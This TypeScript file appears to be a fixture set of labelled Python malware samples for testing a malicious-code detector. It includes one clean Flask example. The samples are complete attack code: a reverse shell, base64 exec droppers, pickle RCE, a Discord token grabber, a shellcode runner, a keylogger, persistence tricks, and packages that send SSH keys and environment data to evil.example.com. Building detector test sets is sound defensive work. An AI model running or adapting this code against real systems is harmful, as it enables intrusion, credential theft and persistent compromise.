export interface SampleThreat {
  id: string;
  name: string;
  description: string;
  expectedVerdict: "malicious" | "dangerous" | "suspicious" | "clean";
  tags: string[];
  code: string;
}

// NOTE: All samples are inert / sanitized (placeholder IPs, revoked-looking
// tokens). They exist purely to demonstrate detector coverage. Do NOT use them
// against systems you do not own.

export const SAMPLES: SampleThreat[] = [
  {
    id: "reverse-shell-classic",
    name: "Classic Python Reverse Shell",
    description:
      "The textbook reverse shell: connects back to an attacker IP and wires stdin/stdout/stderr onto the socket via os.dup2, then spawns a shell with subprocess.",
    expectedVerdict: "dangerous",
    tags: ["reverse-shell", "network", "critical"],
    code: `import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
`,
  },
  {
    id: "base64-exec-dropper",
    name: "Base64-encoded Payload Dropper",
    description:
      "A common dropper pattern: a long base64 blob is decoded at runtime and exec'd, hiding the real payload from static string scans.",
    expectedVerdict: "dangerous",
    tags: ["obfuscation", "code-execution"],
    code: `import base64

# "payload" decoded at runtime to hide from static review
payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaSA+IC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQnKQ=="
exec(base64.b64decode(payload))
`,
  },
  {
    id: "pickle-rce",
    name: "Pickle Deserialization RCE",
    description:
      "A malicious pickle uses __reduce__ to execute shellcode when the pickle is loaded. Loading untrusted pickle = instant RCE.",
    expectedVerdict: "dangerous",
    tags: ["deserialization", "critical"],
    code: `import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami", ))

# attacker-controlled pickle bytes arrive over the network
data = b"cos\\nsystem\\n(S'whoami'\\ntR."
pickle.loads(data)
`,
  },
  {
    id: "discord-token-grabber",
    name: "Discord Token Grabber",
    description:
      "Reads Discord's local leveldb store to extract auth tokens, then exfiltrates them to a Discord webhook — a full account takeover with no 2FA.",
    expectedVerdict: "dangerous",
    tags: ["credential-theft", "exfiltration"],
    code: `import os, re, requests, json

WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnop"
path = os.path.expanduser("~/.config/discord/Local Storage/leveldb")
tokens = []
for f in os.listdir(path):
    if f.endswith(".ldb") or f.endswith(".log"):
        with open(os.path.join(path, f), errors="ignore") as fh:
            for m in re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", fh.read()):
                tokens.append(m)

requests.post(WEBHOOK, json={"content": "\\n".join(tokens)})
`,
  },
  {
    id: "ctypes-shellcode",
    name: "ctypes Shellcode Runner (Windows)",
    description:
      "Allocates executable memory with VirtualAlloc, copies shellcode bytes into it, and calls it as a function via ctypes — in-process native payload execution.",
    expectedVerdict: "dangerous",
    tags: ["code-execution", "dangerous-import"],
    code: `import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = wintypes.LPVOID
kernel32.VirtualAlloc.argtypes = (wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD)

# placeholder shellcode (just a NOP sled)
buf = b"\\x90" * 64
ptr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)  # PAGE_EXECUTE_READWRITE
ctypes.memmove(ptr, buf, len(buf))
kernel32.CreateThread(None, 0, ptr, None, 0, None)
kernel32.WaitForSingleObject(kernel32.GetCurrentThread(), 0xFFFFFFFF)
`,
  },
  {
    id: "env-trigger-backdoor",
    name: "Environment-Triggered Backdoor",
    description:
      "Looks innocent in code review: only activates when a specific environment variable is set. An attacker with write access to env config flips the switch for RCE.",
    expectedVerdict: "malicious",
    tags: ["code-execution", "suspicious-pattern"],
    code: `import os

def init_app():
    configure_logging()
    setup_routes()

    # "feature flag" — actually a backdoor trigger
    debug_hook = os.environ.get("APP_DEBUG_HOOK")
    if debug_hook:
        exec(debug_hook)
`,
  },
  {
    id: "fileless-http-exec",
    name: "Fileless HTTP exec (mutable payload)",
    description:
      "Fetches Python source from a raw pastebin URL and exec's it directly from memory. The payload never touches disk and can be changed server-side at any time.",
    expectedVerdict: "dangerous",
    tags: ["code-execution", "network"],
    code: `import urllib.request

url = "https://pastebin.com/raw/xxxxxxxx"
stage2 = urllib.request.urlopen(url).read().decode()
exec(stage2)
`,
  },
  {
    id: "registry-persistence",
    name: "Windows Registry Persistence",
    description:
      "Writes itself to the HKCU Run key so the payload executes at every login. Combined with the obfuscated exec this is a persistent backdoor.",
    expectedVerdict: "dangerous",
    tags: ["persistence", "obfuscation"],
    code: `import winreg, base64, os

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
    r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, os.path.abspath(__file__))

# obfuscated stage
exec(base64.b64decode("aW1wb3J0IHNvY2tldDsKc29ja2V0LnNvY2tldCgpLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQ=="))
`,
  },
  {
    id: "keylogger",
    name: "Global Keylogger",
    description:
      "Uses the 'keyboard' library to capture every keystroke system-wide and writes them to a hidden log file — credential theft via keylogging.",
    expectedVerdict: "malicious",
    tags: ["credential-theft", "dangerous-import", "filesystem"],
    code: `import keyboard, os

log_path = os.path.expanduser("~/.cache/.update_cache")
def on_press(event):
    with open(log_path, "a") as f:
        f.write(event.name + "\\n")

keyboard.on_press(on_press)
keyboard.wait()
`,
  },
  {
    id: "clean-script",
    name: "Clean, benign Python script",
    description:
      "A normal Flask endpoint with no suspicious patterns. Used to verify the detector does not flag innocent code.",
    expectedVerdict: "clean",
    tags: ["benign"],
    code: `from flask import Flask, jsonify, request
import json

app = Flask(__name__)

@app.get("/api/health")
def health():
    return jsonify(status="ok")

@app.post("/api/echo")
def echo():
    data = request.get_json()
    return jsonify(echo=data)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
`,
  },
  {
    id: "supply-chain-typosquatting",
    name: "Supply Chain Attack (Typosquatting)",
    description:
      "A malicious package mimicking the popular 'requests' library (named 'reqeusts'). Auto-executes on import: persists via crontab, exfiltrates SSH keys and environment variables to an external server, then provides a legitimate-looking API surface.",
    expectedVerdict: "dangerous",
    tags: ["persistence", "exfiltration", "credential-theft", "network", "suspicious-pattern"],
    code: `# Malicious typosquatting package: "reqeusts" (mimics "requests")
import os
import sys
import subprocess

def _persist():
    """Silent persistence via crontab"""
    os.system('(crontab -l 2>/dev/null; echo "*/5 * * * * python3 -c \'import reqeusts\'") | crontab -')

def _exfil():
    """Exfiltrate SSH keys and environment variables"""
    import urllib.request
    import base64
    keys = ""
    for f in ["~/.ssh/id_rsa", "~/.ssh/id_ed25519"]:
        try:
            with open(os.path.expanduser(f)) as kf:
                keys += kf.read()
        except:
            pass
    env_data = base64.b64encode(str(dict(os.environ)).encode()).decode()
    urllib.request.urlopen(f"https://evil.example.com/collect?d=\${env_data}&k=\${base64.b64encode(keys.encode()).decode()}")

# Auto-execute on import
try:
    _persist()
    _exfil()
except:
    pass

# Legitimate-looking API surface
def get(url, **kwargs):
    import requests
    return requests.get(url, **kwargs)
`,
  },
  {
    id: "cryptominer-dropper",
    name: "Cryptominer Dropper",
    description:
      "Disguised as an 'auto-updater service', this script downloads and executes a cryptominer binary in the background. Uses base64-encoded URLs to evade static analysis, hides the binary in /tmp with a system-like name, and achieves persistence via .bashrc modification.",
    expectedVerdict: "dangerous",
    tags: ["code-execution", "persistence", "network", "obfuscation", "command-execution"],
    code: `#!/usr/bin/env python3
"""Auto-updater service — totally legitimate"""
import os
import subprocess
import urllib.request
import base64
import tempfile
import stat

MINER_URL = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3htaW5lci56aXA="  # base64 encoded
CONFIG_URL = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL2NvbmZpZy5qc29u"

def _decode(url_b64):
    return base64.b64decode(url_b64).decode()

def install():
    tmp = tempfile.mktemp(suffix=".sh")
    urllib.request.urlretrieve(_decode(MINER_URL), tmp)
    os.chmod(tmp, stat.S_IEXEC | stat.S_IREAD)
    subprocess.Popen([tmp, "--background", "--config", _decode(CONFIG_URL)],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Hide in /tmp with innocent name
    hide = "/tmp/.systemd-logind"
    os.rename(tmp, hide)

    # Persistence via .bashrc
    with open(os.path.expanduser("~/.bashrc"), "a") as f:
        f.write(f"\\n(nohup \${hide} --background > /dev/null 2>&1 &)\\n")

if __name__ == "__main__":
    install()
`,
  },
  {
    id: "dependency-confusion",
    name: "Dependency Confusion Attack",
    description:
      "A setup.py for a package named 'internal-utils' that phones home with host details, username, working directory, and environment variable keys during installation. Exploits dependency confusion by being published on PyPI with a higher version number than the internal package.",
    expectedVerdict: "malicious",
    tags: ["exfiltration", "network", "suspicious-pattern"],
    code: `"""setup.py for internal-utils — accidentally published to PyPI"""
from setuptools import setup
import os
import json
import urllib.request

def _send_home():
    """Phone home with environment details"""
    try:
        data = {
            "host": os.uname().nodename if hasattr(os, 'uname') else "unknown",
            "user": os.environ.get("USER", "unknown"),
            "cwd": os.getcwd(),
            "env_keys": list(os.environ.keys()),
            "path": os.environ.get("PATH", ""),
        }
        req = urllib.request.Request(
            "https://evil.example.com/ping",
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# Execute during package install
_send_home()

setup(
    name="internal-utils",
    version="99.0.0",
    packages=[],
    description="Internal utility functions",
)
`,
  },
];

export const getSampleById = (id: string): SampleThreat | undefined =>
  SAMPLES.find((s) => s.id === id);
